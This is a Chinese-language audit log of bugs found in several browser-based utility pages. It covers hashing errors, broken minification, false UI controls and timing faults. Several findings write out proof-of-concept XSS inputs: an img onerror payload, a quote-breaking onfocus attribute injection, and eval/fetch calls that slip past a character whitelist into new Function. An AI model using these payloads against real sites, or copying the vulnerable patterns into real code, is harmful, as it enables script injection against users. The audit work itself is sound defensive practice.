- 复现：切"内容"分类 → 实际出现 `Range`（请求范围，属请求头），"共 N 项"计数把重复条目也算进去；期望响应头表只含响应头、无重复行。
- 影响：用该表逐项核对生产响应头会误判（去查一个根本不会出现在响应里的头），分类统计数字也偏高。
- 方案：删除请求头或单列"请求头"分类；去掉重复的 `ETag` / `Last-Modified`。
- 假工具：否

### IT-N460 待签名串未转义直接写入 innerHTML，参数可执行脚本（高，安全）
- 页面：`tools/it/api-sign-generator.html`
- 问题：`signText = base + '&secret=' + secret`（`:297-298`）中 `base` 由用户参数原样拼接，随后直接 `document.getElementById('out').innerHTML = '<p>待签名串：<strong>${signText}</strong></p>'`（`:311-312`），全程无转义。
- 行号：`:281-298`、`:311-312`
- 复现：参数框输入一行 `<img src=x onerror=alert(1)>=1` → `parseParams` 取 k=`<img src`、v=`x onerror=alert(1)>=1`，拼成 `<img src=x onerror=alert(1)>=1` 插入 DOM → 实际执行 `onerror` 弹窗；期望只作为纯文本显示。
- 影响：只要粘贴别人给的参数（或从共享文档复制的签名串）就能在本站执行任意脚本，可读本站 localStorage、伪造结果区或跳转页面。
- 方案：改用现成的 `escH()` 逐段拼接，或用 `textContent` + 单独 `<strong>` 节点渲染。
- 假工具：否

### IT-N461 "MD5" 选项实为 SHA-256 取前 32 位，签名与任何 MD5 服务端都不匹配（高，算错）
- 页面：`tools/it/api-sign-generator.html`
- 问题：`md5Hex()` 实际执行 `crypto.subtle.digest('SHA-256', …)` 再 `.slice(0,32)`（`:253-263`），下拉文案为"MD5（兼容：SHA-256 取前 32 位）"（`:137`），但 `formula-eq`（`:124`）与 `formula-desc` 仍写"MD5 模式：sign = MD5(待签名串)"、"对拼接串做 MD5"（`:129`）。
- 行号：`:253-263`（核心 `:256`、`:260`）、`:137`、`:124`、`:129`
- 复现：默认参数（`amount=39.80&app_id=1001&method=order.create`、secret `test_secret`）→ 实际输出 `b9777fe0ef17ab7900fe95ad22b1134c`；node 复算真 MD5(`…&secret=test_secret`) = `cd1422f9e084e02caf2bf8842ec5492d`。期望两者一致。
- 影响：选 MD5 得到的串在服务端一律验签失败，且无法用 `md5sum` / 任何标准工具复核，排查成本极高。
- 方案：内置纯 JS MD5（或接 spark-md5 并锁版本）；更简单的做法是删掉 MD5 选项，只保留 HMAC-SHA256 并同步改写公式与文案。
- 假工具：否（假算法）

### IT-N462 预设 / 历史回调调 `copyResult` 不重算，且预设参数用 `&` 分隔被解析成单个值（中，结果错误）
- 页面：`tools/it/api-sign-generator.html`
- 问题：预设 bar 与历史恢复的回调都传 `function(){ copyResult(); }`（`:425`、`:373`），`copyResult` 只复制不计算，参数框也没有 `oninput` 重算；预设 `params` 写成 `'a=1&b=2&c=3'`（`:423`、`:425`），而 `parseParams` 只按 `\n` 切分（`:281`）。
- 行号：`:281`、`:422-425`（预设值 `:423`、`:425`；回调 `:425`）、`:373`
- 复现：点「SHA256·参数」→ 实际参数框变成单行 `a=1&b=2&c=3`，node 复算 `parseParams` 得 `{a:"1&b=2&c=3"}`（1 个参数），结果区仍是上一轮签名；期望解析成 3 个参数并重算，得 HMAC `1faea69380f0ed8d2c2b6c5aca63df82a7860a473e55a9f75e8c348d5ec3d106`（规范串 `a=1&b=2&c=3`）。
- 影响：预设点了没反应，照着预设学的人会拿到与文档不符的规范化串，签名全错。
- 方案：回调改 `runSign()`；预设 `params` 改换行分隔，或让 `parseParams` 同时按 `&` 切分。
- 假工具：否

### IT-N463 解密按"纯十六进制"猜格式，Base64 密文恰为 hex 时被误当 Hex 解出乱码（中，结果错误）
- 页面：`tools/it/rc4.html`
- 问题：解密分支用 `/^[0-9a-fA-F\s]+$/` + 偶数长度判定输入是 Hex，否则走 Base64（`:383-387`）；Base64 密文若恰好只含 `0-9a-f` 且长度为偶数就会被误判。
- 行号：`:383-387`、`:357-364`
- 复现：key `mysecretkey`、明文 `1bb` → 加密得 Base64 `27Ea`（4 字符全为 hex）→ 解密按 hex 读 2 字节，实际输出 `�9`；期望输出 `1bb`。node 随机采样 200k 组 3 字节密文，命中 2744 例（≈1.37%）。
- 影响：短密文解密静默出乱码，用户分不清是密钥错还是格式误判，且换台机器/换个版本结果也不稳定。
- 方案：按"输出格式"选择输入格式（Base64 与 Hex 各一个显式选项），或先 `atob` 成功再用 Base64、失败再回退 Hex。
- 假工具：否

### IT-N464 正则删注释 + 抹掉换行，会破坏字符串 / 正则 / 模板字符串与 ASI，输出废码（高，算错）
- 页面：`tools/it/js-minify.html`
- 问题：`minify()` 依次 `replace(/\/\*[\s\S]*?\*\//g,'')`、`replace(/\/\/[^\n]*/g,'')`、`replace(/\s+/g,' ')`（`:216-222`），完全不识别字符串、模板字符串、正则字面量，也把换行压成空格（ASI 依赖换行）。
- 行号：`:216-222`（核心 `:217-219`）、`:230`
- 复现（node 复刻同函数）：
  - `var u = "https://api.example.com/v1";` + 下一行 `console.log(u);` → 实际 `var u= "https: console.log(u);"`（URL 后半与整行被当注释吃掉，`new Function` 解析失败）；
  - `var a = 1` 换行 `var b = 2` → `var a= 1 var b= 2`（SyntaxError）；
  - `` const t = `line1\nline2`; `` → 实际 `` const t= `line1 line2`; ``，模板字符串的值被改；
  - `function f(){ return` 换行 ` 42 }` → `return 42`，语义由返回 undefined 变为返回 42。
- 影响：页面 `:103`、`:168` 称"几乎不改变行为"，实际对含 URL、正则、模板字符串或无分号风格的真实代码直接产出不可执行/语义漂移的结果；用户拿去上线即报错。
- 方案：改用 tokenizer（acorn/esprima）或直接调 Terser；最低限度也要保留换行、跳过字符串与正则区间，并在页面声明"仅适用于带分号的简单代码"。
- 假工具：否

### IT-N465 `esc()` 不转义双引号，参数值拼进 `value="…"` 造成属性注入执行脚本（高，安全）
- 页面：`tools/it/url-params.html`
- 问题：`esc()` 用 `div.textContent` 再读 `div.innerHTML`（`:285`），只转义 `&`/`<`/`>`，双引号原样保留；解析结果被 `tpl.replace('{v}', esc(p.v))` 拼进模板 `<input … value="{v}">`（模板定义 `:162`，替换在 `:298`），JSON 导入同样（`:343`），整段走 `innerHTML`（`:299`、`:344`）。
- 行号：`:162`、`:285`、`:293`、`:298-299`、`:343-344`
- 复现：URL 输入 `https://x.com/?a=" autofocus onfocus="alert(1)` → 实际生成 `<input … value="" autofocus onfocus="alert(1)">`，`innerHTML` 插入后 `autofocus` + `onfocus` 触发脚本；期望引号被转成 `&quot;`，只当普通值显示。
- 影响：从聊天记录/工单里粘贴一条"参数含引号"的 URL 就能在本站执行脚本，可读 localStorage、伪造结果或整页替换。
- 方案：属性上下文改用 `escAttr()`（额外转义 `"` 与 `'`），或先 `document.createElement('input')` 再 `el.value = p.v` 赋值，避免字符串拼 HTML。
- 假工具：否

### IT-N466 「值解码显示：开 / 关」是假控件，`_decMode` 从未被计算逻辑读取（高，假功能）
- 页面：`tools/it/url-params.html`
- 问题：`toggleEncoding()` 只翻转 `_decMode` 并改按钮文案（`:284`、`:349-353`），而 `calcTool()` 解析时恒执行 `decodeURIComponent(k.replace(/\+/g,' '))`（`:293`），从不判断 `_decMode`。
- 行号：`:284`、`:293`、`:349-353`
- 复现：点「值解码显示：关」→ 实际按钮文字变"关"，参数值仍是解码后的 `toolbox`；期望切换为原始 `%74oolbox` / `%E6%89%8B%E6%9C%9F` 形态。
- 影响：切换按钮纯装饰，用户以为能看到编码前后对照，核对编码时会得出错误结论。
- 方案：`calcTool` 按 `_decMode` 分别取 `decodeURIComponent(v)` 或原样值。
- 假工具：否（假控件）

### IT-N467 `decodeURIComponent` 无容错，非法百分号转义抛 URIError 后整块停止刷新（中，崩溃）
- 页面：`tools/it/url-params.html`
- 问题：`calcTool()` 在 `forEach` 里直接 `decodeURIComponent(k…)` / `decodeURIComponent(v…)`（`:293`），无 `try/catch`。
- 行号：`:293`、`:286-301`
- 复现：URL 输入 `https://x.com/?q=100%` → 实际抛 `URIError: URI malformed`，行内 `oninput` 中断，参数区与结果区停留在上一次内容（改别的参数也不再刷新）；期望提示"参数编码非法"并继续渲染其余参数。
- 影响：日志、埋点、手工拼的 URL 常带不完整转义，一出现就让整页解析静默失效，且界面看不出报错。
- 方案：逐个 `try/catch`，失败时回落原文并加"未解码"标记。
- 假工具：否

### IT-N468 短码是纯随机串，与 URL 无任何函数关系，并非 base62/hash 编码（中，承诺未实现）
- 页面：`tools/it/short-link-generator.html`
- 问题：短码循环只用 `crypto.getRandomValues` 抽字符（`:283-287`），URL 仅被显示、不参与运算；`formula-eq`（`:160`）称"短码 = base62(自增 ID) 或 hash(长链) 前 N 位"，description（`:10`）称"将长网址编码为简短易记的短链"，英文简介写 "using Base62 encoding"（`:482`）。
- 行号：`:283-287`、`:160`、`:10`、`:482`、`:219`
- 复现：同一 URL 连点两次「生成」→ 实际得到两组完全不同的随机串；同参数下任意两个不同 URL 的短码分布也无差别。期望同一条长链得到稳定短码（hash 方案）或按自增 ID 编码。
- 影响：页面演示的是"随机字符串生成器"，"编码 / 映射"承诺未兑现；FAQ `:219` 只说明没有服务端跳转，没说明短码与 URL 无关，读者会误以为它真的编码了 URL。
- 方案：改为 `base62(hash(url))` 取前 N 位（同链稳定）并保留自增 ID 模式作对照；或把标题/描述改成"短码样式演示（随机）"。
- 假工具：否

### 覆盖清单（W 批 IT URL/签名/安全）
- `url-qr`：IT-N456（高，假工具）；IT-N457（中）。
- `og-meta-tag-generator`：IT-N458（中）；无高优缺陷（`escA` 先转 `&` 再转 `"`，输出走 `textarea.value`，属性上下文不可注入）。
- `http-response-headers`：IT-N459（中）；无高优缺陷（`renderCommands` 对全部字段走 `escapeHtml`，搜索/复制路径无注入）。
- `api-sign-generator`：IT-N460（高，安全）、IT-N461（高）；IT-N462（中）。
- `rc4`：IT-N463（中）；无高优缺陷（`rc4()` 与 `RC4-drop` 主路径对照已知向量 `Key`/`Plaintext` → `bbf316e8d940af0ad3` 正确，KSA/PRGA 无死循环）。
- `js-minify`：IT-N464（高）；无其它高优项（结果渲染走 `escH`，无注入）。
- `url-params`：IT-N465（高，安全）、IT-N466（高，假功能）；IT-N467（中）。
- `short-link-generator`：IT-N468（中）；无高优缺陷（输出全部经 `escapeHtml`，`randInt` 模偏差可忽略）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数（`renderQR`、`minify`、`rc4`、`parseParams`、`md5Hex`）并给出「输入 → 实际 / 期望」；MD5 对照用 `crypto.createHash('md5')`，QR 不可扫码依据"无数据位/格式信息/纠错码字"的算法结构判定；`esc()` 不转义双引号、`innerHTML` 属性注入按 HTML 序列化规则判定（文本节点只转义 `&<>`），未开真机浏览器复现 XSS。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## W 批 · IT 计算/文本（2026-11-04）

### IT-N469 MD5 按 UTF-16 码元填充而非 UTF-8 字节，非 ASCII 文本摘要与标准 MD5 不符（高，算错）
- 页面：`tools/it/calc-10.html`
- 问题：`md5()` 的 `convertToWordArray()` 直接取 `str.charCodeAt()` 写进 32 位字（`:286`），消息长度也用 `str.length`（UTF-16 码元数，`:277`、`:292-293`），从未经过 UTF-8 编码；同页 SHA-1/256/512 走 `utf8ToBytes()`（`:224-227`、`:235`）故正确。表格 `:169` 明写"同一文本须固定 UTF-8 编码"。
- 行号：`:239`、`:275-295`（关键 `:277`、`:286`、`:292-293`）、`:224-227`、`:169`
- 复现（node 抽取页面原 `md5()` 直接运行，对照 `crypto.createHash('md5')` 与 `printf '中文' | md5`）：
  - `abc` → 实际 `900150983cd24fb0d6963f7d28e17f72`，标准同值（ASCII 正常）；
  - `中文` → 实际 `cbf9d3b2a52d5822928e434642f5077a`，标准 `a7bac2239fcdcb3a067903d8077c4a07`；
  - `café` → 实际 `961f50f6282239d09e48f812c1ca7276`，标准 `07117fe4a1ebd544965dc19573183da2`；
  - `😀` → 实际 `2843eed96aa1750ead0763263455f324`，标准 `2a02eac39d716a70ecf37579185927b6`；`你好，世界`、`测试`×10 同样不符。
- 影响：中文/重音/emoji 文本的 MD5 与 `md5sum`、后端、CI 校验值全部对不上，用户会误判文件被篡改；同页 SHA 行却是对的，进一步掩盖问题。
- 方案：先 `new TextEncoder().encode(text)` 取字节数组，按 `bytes.length` 填充并逐字节写入，再跑现成的四轮函数；或在 MD5 前统一转字节。
- 假工具：否

### IT-N470 表达式求值器的"字符白名单"放行任意字母标识符，`new Function` 内可直达 `eval`/`fetch`/`localStorage`（高，安全）
- 页面：`tools/it/math-evaluator.html`
- 问题：白名单 `/^[0-9+\-*\/%^().,\sA-Za-z%]+$/`（`:293`）放行全部 `A-Za-z`，并不只限"函数名"；随后 `new Function(... , 'return ('+js+')')`（`:296`）在页面全局作用域执行，表达式可直接引用 `eval`、`fetch`、`document`、`localStorage` 等全局对象，字符串可用 `String.fromCharCode(...)` 无引号构造。页面 `:115`、`:119`、`:121` 却宣称"字符白名单校验""Shunting-yard 解析""绝不可用 eval"。
- 行号：`:293`、`:295-297`；文案 `:115`、`:119`、`:121`、`:112`、`:8`
- 复现（node 复刻同一校验 + `new Function` 路径）：
  - `eval(String.fromCharCode(50,42,51))` → 实际返回数字 `6`（页面显示「结果：6」），期望被拦截为"表达式含非法字符"；
  - `eval(String.fromCharCode(49,43,49))` → 实际 `2`；
  - `fetch(String.fromCharCode(47,47,120,46,99))` → 实际真的调用 `fetch('//x.c')`（node 侧报 `Invalid URL`，证明已执行），把字符码换成本站数据即可外发；
  - `localStorage.getItem(...)` / `document.title` 同样可直接访问（node 无这两个全局才报未定义，浏览器中存在）。
- 影响：任何粘贴来的"表达式"都能在本站执行任意 JS：读取/改写全站共用的 localStorage（历史、偏好）、把数据经 `fetch` 外送、篡改页面内容；白名单形同虚设，与页面自述的安全模型相反。
- 方案：白名单改为 `[0-9+\-*/().,\s^%]` + 严格枚举函数名（先 tokenize 再校验标识符只能是 `sin/cos/...`），或换成真正的 Shunting-yard 解析器（`:119` 已如此声称）；彻底移除 `new Function`。
- 假工具：否

### IT-N471 叉积夹角用 `asin` 只返回 0–90°，钝角被镜像成锐角（高，算错）
- 页面：`tools/it/vector-cross-product.html`
- 问题：`θ = asin(|A×B|/(|A||B|))`（`:283-285`）。`sinθ` 在 90°–180° 单调下降，`asin` 只能给 0–90°，无法区分 θ 与 180°−θ；正确做法是 `atan2(|A×B|, A·B)`（0–180°）。
- 行号：`:283-285`、`:287`；FAQ `:213` 自述"夹角为 0° 或 180°"
- 复现（node 复刻同式）：
  - A=(1,0,0)、B=(−1,1,0)：实际 `sin θ = 0.7071 → θ = 45°`，期望 135°（A·B=−1、|A×B|=1 → `atan2(1,−1)=135°`）；
  - A=(1,0,0)、B=(−1,0,0)：实际 `θ = 0°`（并提示"平行"），期望 180°；
  - 对照直角/锐角：A=(1,0,0)、B=(0,1,0) → 90°；A=(1,1,0)、B=(1,0,0) → 45°，均正确。
- 影响：所有点积为负（夹角 >90°）的用例都少算成 180°−θ，用户据此判断朝向/共线方向会得反向结论，而 FAQ 又承认 180° 存在。
- 方案：`dot=A[0]*B[0]+A[1]*B[1]+A[2]*B[2]`；`θ=Math.atan2(mC,dot)*180/Math.PI`；`mC<ε` 时按 `dot` 符号给 0°/180°。
- 假工具：否

### IT-N472 拼音表仅 59 个有效汉字，默认"中文转拼音"把其余汉字静默删除且不音节分隔（高，承诺未实现）
- 页面：`tools/it/slug-generator-advanced.html`
- 问题：`PINYIN`（`:274-282`）共 64 键，其中 5 个是永不匹配的死键（`'的2'`、`'计2'`、`'开2'`、`'前2'`、`'后2'`），有效单字仅 59 个；`slugify` 对未命中字 `PINYIN[c]||(trans?'x':'')`（`:302`），默认（`transliterate` 未勾、`:182`）直接产出空串即被删除；已命中字也直接粘连，不插分隔符。
- 行号：`:274-282`、`:299-313`（`:302`）、`:181`（默认 `checked`）、`:222`（示例）、`:158`
- 复现（node 直接加载页面真实 `PINYIN` 表与 `slugify()`，默认参数）：
  - `Hello 世界!` → 实际 `hello`，页面 `:222` 声称 `hello-shi-jie`；
  - `我的博客文章标题 - Part 1` → `wodebokewenzhangbiaoti-part-1`（8 音节粘连），期望 `wo-de-bo-ke-wen-zhang-biao-ti-part-1`；
  - `人工智能技术` → `rengongneng`（智/技/术 被删）；`产品发布` → `fa`（产/品/布 被删）；`高级 Slug 生成器` → `slug`。
- 影响：默认参数下大多数中文标题生成残缺甚至近乎空白的 slug（"高级 Slug 生成器"只剩 `slug`），页面自带示例与实际输出自相矛盾，用户拿去建 URL 会得到无意义链接。
- 方案：换完整拼音字典（如 `pinyin-pro` 静态引入）或默认改为"保留原字符/URL 编码"；音节间补 `sep`，未命中字显式告警而非静默删除。
- 假工具：否

### IT-N473 处理流程宣称"去除变音符号 é→e"，实际直接删除该字母（中，承诺未实现）
- 页面：`tools/it/slug-generator-advanced.html`
- 问题：`formula-list :162` 写"去除变音符号（如 é→e）"，但代码没有任何 NFD 规范化或变音替换；非 CJK 的非 ASCII 字符先 `out+=c`（`:309-311`），再被 `[^a-zA-Z0-9sep]` 整字符删除（`:320`）。
- 行号：`:162`、`:299-320`（`:310`、`:320`）、deep-dive 表 `:250`
- 复现（页面真实 `slugify()`）：`café` → 实际 `caf`（期望 `cafe`）；`naïve résumé` → 实际 `nave-rsum`（期望 `naive-resume`）；`Привет мир` → 实际空串（表 `:250` 称"非 ASCII 字符需音译或转写"）。
- 影响：带重音的拉丁标题/文件名会丢字母，输出与文案承诺不符，且用户难以发现是"被删"而非"原始输入有误"。
- 方案：先 `s.normalize('NFD').replace(/\p{M}/gu,'')` 再走原流程；或把文案改成"非 ASCII 字符直接删除"。
- 假工具：否

### IT-N474 宣称支持取模 `%`，实际任何 `a%b` 都被改写成 `(a/100)b` 并语法报错（中，承诺未实现）
- 页面：`tools/it/math-evaluator.html`
- 问题：求值前 `expr.replace(/(\d+)\s*%/g,'($1/100)')`（`:295`）把所有"数字+%"无条件改写为百分比，`%` 从未作为取模运算符保留；而 `<title>`/description（`:8`、`:11`、`:17`）、h2（`:112`）、formula-list（`:120` "取模"）都宣称支持 `%`。
- 行号：`:295`、`:293`、`:120`、`:112`、`:8`
- 复现（node 复刻同路径）：`7%3` → 改写为 `(7/100)3`，抛 `SyntaxError: Unexpected number`，页面显示"表达式无效：Unexpected number"；`10%3`、`10 % 3` 同样报错；期望 1 / 1 / 1。`15%` → 0.15、`50%*120` → 60 正确（百分比侧可用）。
- 影响：SEO 描述与公式说明都教用户用 `%` 取模，一用即"表达式无效"，且无任何提示说 `%` 只能当百分比。
- 方案：区分取模与百分比（`%` 作取模；百分比要求 `%` 紧跟数字且后接运算符/结束/括号）；或改回取模并另设 `pct()`。
- 假工具：否

### IT-N475 历史「复用」按钮的 `onclick` 被 `JSON.stringify` 的双引号截断，点击无任何反应（中，功能失效）
- 页面：`tools/it/math-evaluator.html`
- 问题：`renderHist` 把 `JSON.stringify(x.e)`（自带双引号）拼进 `onclick="…value="+JSON.stringify(x.e)+";calc()"`（`:284`），而属性本身用双引号包裹，属性值在表达式开头的 `"` 处提前结束。
- 行号：`:284`、`:302-304`、`:307`
- 复现（`python3 html.parser` 解析页面同形片段）：`onclick` 实际只剩 `document.getElementById('expr').value=`，其后 `2^10`、`+`、`sqrt(144)`、`*`、`sin(pi` 等被当成属性名（`('2^10', None)`、`('sqrt(144)', None)`…）；点击「复用」时 onclick 编译即 `SyntaxError`，输入框与结果都不变。期望回填 `2^10 + sqrt(144) * sin(pi/6)` 并重算 1030。先点一次「计算」生成的那条历史同样失效。
- 影响：历史记录只能看不能复用，每条记录的按钮都是死的，用户会以为自己点错位置。
- 方案：去掉内联 `onclick`，改 `data-expr` + 事件委托（`btn.dataset.expr` 赋给输入框），或至少把 JSON 串做 HTML 属性转义（`&quot;`）。
- 假工具：否

### IT-N476 质数页不做整数校验：小数被向下取整、>2^53 被浮点舍入，判定对象被静默替换（中，结果错误）
- 页面：`tools/it/prime-checker.html`
- 问题：`num()` 只 `parseFloat`（`:212`），`calcTool()` 再 `Math.floor`（`:215`）；输入框 `step="1"` 但不校验合法性（`:125`）。`isPrime` 与因式分解都基于被改写后的 `n`（`:218`、`:221-227`）。
- 行号：`:212`、`:215`、`:218`、`:221-227`、`:125`
- 复现（node 复刻）：
  - 输入 `2.5` → 实际显示「2 是质数 ✅」，期望提示"请输入整数"；
  - 输入 `9007199254740993`（=3 × 3002399751580331）→ `parseFloat` 得 `9007199254740992`（2^53）→ 实际显示「9007199254740992 是合数，最小质因数 2，因数分解 53 个 2」，期望「9007199254740993 … 最小质因数 3」；
  - 输入 `1e21` → 实际显示 `1e+21` 并直接判"合数"。
- 影响：大整数（RSA 教学、雪花 ID、订单号）的质数判定与因数分解对着另一个数算，结果错误且无任何提示。
- 方案：用 `BigInt` + 试除（配 Miller-Rabin）做精确判定与分解；或最低限度校验 `Number.isSafeInteger(n)` 并提示"仅支持 ≤ 2^53 的整数"，小数直接拒绝而非 `floor`。
- 假工具：否

### IT-N477 零向量仍输出方向余弦/方向角（0 与 90°），与"零向量无方向"自相矛盾（中，结果错误）
- 页面：`tools/it/vector-magnitude.html`
- 问题：单位向量分支对 `m≈0` 有专门提示（`:283-287`），但方向角分支不判零：三维直接 `v[i]/(m||1)`（`:292-294`），二维 `atan2(0,0)`（`:290`）。
- 行号：`:290-296`（`:292-294`）、`:283-287`、formula `:155`
- 复现：v=(0,0,0) → 实际依次输出「|v| = 0」「零向量无单位向量。」「方向余弦：cos α = 0, cos β = 0, cos γ = 0」「方向角：α = 90°, β = 90°, γ = 90°」；切换二维、v=(0,0) → 「方向角 θ = 0°」。期望零向量不输出方向余弦/角，或标注"方向未定义"。
- 影响：零向量方向在数学上未定义，页面却给出确定值，与自身 formula 文本"零向量无单位向量"冲突，学习者会形成错误结论。
- 方案：方向余弦/方向角分支加 `if(m>1e-12)` 守卫，否则输出"零向量方向未定义"。
- 假工具：否

### IT-N478 中文 2–4 字滑窗计频且去重只处理 ≤2 字，默认示例前 8 条有 7 条是同一短语的重叠碎片（中，结果冗余/错误）
- 页面：`tools/it/keyword-extractor.html`
- 问题：`tokenizeChinese` 对每个连续中文段生成全部 2/3/4 字子串（`:493-498`）；`deduplicateSubstrings` 只对 `item.word.length <= 2` 做包含过滤（`:571`），3 字碎片即便被同频 4 字词包含也保留。`topSet`（`:561-565`）算完从未使用，formula `:185` 宣称"取前 30 个高频词做共现加权"实际不存在。
- 行号：`:493-498`、`:558-583`（`:571`、`:561-565`）、`:185`、`:600-613`
- 复现（node 用页面真实 `CN_STOPS`/`EN_STOPS` 与四个原函数复刻）：默认输入 → 前 10 实际 `自然语(2), 然语言(2), 语言处(2), 言处理(2), 自然语言(2), 然语言处(2), 语言处理(2), 文本(2), 人工(1), 工智(1)`；预设「中文技术文章」→ `吞吐(2), 大模型(1), 模型推(1), 型推理(1), 推理服(1), 理服务(1), 服务需(1)…`，同样是连续切片。期望同频时只保留最长词/按长度降序，不把同一短语的 2/3/4 字切片并列。
- 影响：默认参数下"关键词"大半是同一词的重叠子串，顺序取决于滑窗生成顺序而非重要性；表格、条形图、导出 CSV 同步失真，用户据此做 SEO/摘要会得到无意义词表。
- 方案：去重对所有长度生效（被同频或更高频长词包含即丢弃），同频按长度降序+首次出现位置排序；或接入真实分词词典。
- 假工具：否

### 覆盖清单（W 批 IT 计算/文本）
- `prime-checker`：IT-N476（中）；无高优缺陷（小整数判定正确：97 质、1000 合、104729 质、999999999999989 质）。
- `matrix-determinant`：无高优/中优缺陷（`detRec` 与 BigInt Bareiss 精确值对照 100 组随机 2–5 阶全对；5×5 整数矩阵得 −4656 一致；Sarrus 正负号与 2×2/3×3 公式均正确）。
- `vector-cross-product`：IT-N471（高）；无其它高优项（叉积分量正确：`(2,3,4)×(5,6,7)=(−3,6,−3)`）。
- `vector-magnitude`：IT-N477（中）；无高优缺陷（模长/单位向量公式正确：`|(3,4)|=5`，三维方向角 `acos(vᵢ/|v|)` 正确）。
- `calc-10`：IT-N469（高，算错）；SHA-1/256/512 经 `TextEncoder` 走 UTF-8，抽验 `中文` 与标准一致。
- `math-evaluator`：IT-N470（高，安全）、IT-N474（中）、IT-N475（中）。
- `slug-generator-advanced`：IT-N472（高，承诺未实现）、IT-N473（中）。
- `keyword-extractor`：IT-N478（中）；无高优缺陷（停用词表实测 183 中文 + 132 英文，标签/表格/图表输出均经 `ToolBox.escHtml`）。
- 方法声明：逐页通读上述 8 页源码，在 `/tmp` 用 `node` 直接抽取/复刻页面原函数（页面真实 `md5()`、表达式白名单 + `new Function`、叉积夹角、`detRec` + BigInt Bareiss、页面真实 `PINYIN` 表 + `slugify()`、`tokenizeChinese`/`filterKeywords`/`deduplicateSubstrings` + 页面真实停用词表、`isPrime`/因式分解）逐一给出「输入 → 实际 / 期望」；MD5 用 `crypto.createHash('md5')` 与 `printf '中文' | md5` 双对照；`onclick` 截断用 `python3 html.parser` 验证属性拆分。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## X 批 · IT 速查/工具（2026-11-04）

> 只读审计 8 页：`tools/it/` 下 ruby-cheatsheet、pomodoro、convert-11、postgresql-cheatsheet、typescript-cheatsheet、typing-test、cpp-cheatsheet、git-commands。未开浏览器、未跑 `_build.py`/`run_gates.py`；验证脚本仅落 `/tmp`。

### IT-N479 — git-commands 58 个「复制」按钮的内联 onclick 无法编译，一键复制全部失效（高，承诺未实现）
- 页面：`tools/it/git-commands.html`
- 行号：`tools/it/git-commands.html:474`（模板拼接）、`:464`（转义）、`:480-489`（复制函数）
- 问题：`renderCommands()` 把示例原文（含真实换行）仅做 `"→&quot;`、`'→&#39;` 处理后拼进 `onclick="copyCode(this, '...')"`。HTML 解析会保留属性内换行（`html.parser` 实测 onclick 值含 `\n`），内联处理器按 JS 编译时单引号字符串出现字面换行 → `SyntaxError: Invalid or unexpected token`；`git tag -l 'v1.*'`（:382）这类含单引号的示例，即使去掉换行也会因 `&#39;` 被 HTML 还原成 `'` 而提前闭合字符串。
- 复现：`node` 从页面抽取 `COMMANDS`（58 条），按页面同款转义后 `new Function('copyCode', attr)` 编译 → **58/58 抛 `Invalid or unexpected token`**；把换行替换为空格后才可编译。
- 实际：点击任一示例右上角「复制」→ 无复制、无 ✅/toast，控制台 SyntaxError；58 个按钮全灭。
- 期望：点击后把该条 `c.example` 写入剪贴板并提示“已复制”。
- 影响：页面 description / og:description（:10、:15）承诺“点击示例右上角按钮可一键复制”，与实际完全相反，属承诺未实现。
- 方案：改 `data-idx="${idx}"` + 容器事件委托（`copyCode(btn, COMMANDS[+btn.dataset.idx].example)`），或 `JSON.stringify(example)` 写入 `data-code`；禁止把多行/含引号文本内联进 `onclick`。
- 假工具：否

### IT-N480 — pomodoro 记账用“配置时长”而非实际时长，未开始/跳过/中途改设置都会虚增统计（中）
- 页面：`tools/it/pomodoro.html`
- 行号：`tools/it/pomodoro.html:517`、`:525-527`、`:559-561`、`:467-480`
- 问题：`completeSession()` 直接 `const duration = durations[currentMode]` 落账；`skipTimer()` 无条件调 `completeSession()`（既不校验是否 running，也不计实际停留）；`updateDurations()` 在运行中只改 `durations`，不改 `timeLeft/totalTime`。
- 复现（3 组）：① 从未开始计时，直接点「⏭ 跳过」→ 确认 → 实际「完成番茄 1、专注分钟 25、总计时 1」、历史新增“专注 25分钟”；期望不计入。② 开始 25 分钟专注、1 分钟后点跳过 → 实际 +25 分钟；期望按实际约 1 分钟（或跳过不落账）。③ 开始 25 分钟后把「专注」改成 50（onchange 生效但倒计时仍走 25:00）→ 走完 → 实际 +50 分钟、历史 50分钟；期望 25 或实际时长。
- 期望：统计与历史反映真实完成次数与实际时长。
- 影响：今日专注分钟/完成番茄数可无成本刷高，番茄工作法的度量失真。
- 方案：记 `startedAt`，完成时用 `Math.round((Date.now()-startedAt)/60000)`；跳过记 0 或不落账；运行中禁止改时长或改后重置本段。
- 假工具：否

### IT-N481 — pomodoro 倒计时按 setInterval 递减，后台标签页被节流后计时严重偏慢（中）
- 页面：`tools/it/pomodoro.html`
- 行号：`tools/it/pomodoro.html:491`、`:504-511`
- 问题：`startTimer()` 每 1000ms 调 `tick()`，`tick` 只做 `timeLeft--`，不按真实时间校准；Chrome 对隐藏标签页节流定时器（隐藏 5 分钟后可降至约 1 次/分钟）。
- 复现：设专注 25 分钟 → 开始 → 切到编辑器工作 10 分钟再回来 → 实际剩余约 20:00（10 分钟只推进约 5 分钟），与真实应剩 15:00 不符，结束提示相应推迟。
- 期望：剩余时间 = 设定时长 −（`Date.now()` − `startedAt`），切回时立即重算。
- 影响：番茄钟的核心使用方式就是“切走专注”，回来看到的剩余时间是错的；页面 `:188` 自述“应以时间戳差值计算剩余时间，而非累加计时”，实现与自述矛盾。
- 方案：保存 `startedAt` + `remainingAtStart`，`tick` 用时间戳算剩余；`visibilitychange` 时立即刷新。
- 假工具：否

### IT-N482 — typing-test 错字仍标绿，错误反馈与准确率自相矛盾（中）
- 页面：`tools/it/typing-test.html`
- 行号：`tools/it/typing-test.html:438`（类别判定）、`:42-43`（从未被应用的 `.char.wrong`）、`:459-463`（错误计数）
- 问题：`renderText()` 只按位置判断 `i < pos ? 'correct'`，从不比较 `input[i]` 与 `text[i]`；全站没有任何代码添加 `wrong` 类。
- 复现：任取一段文本，第 2 个字符故意打错（`abc` 输成 `axc`）→ 实际第 1、2 个字符均为绿色 `.correct`，页面无任何红色；结果卡准确率却显示 66.7%。
- 期望：`i < pos` 且字符不相等时给 `.wrong`（红底），与错误计数一致。
- 影响：用户看不到错在哪，练习反馈失效；CSS 里的错字样式成了死代码。
- 方案：`renderText(input)`，类别改 `i < pos ? (input[i] === text[i] ? 'correct' : 'wrong') : ...`。
- 假工具：否

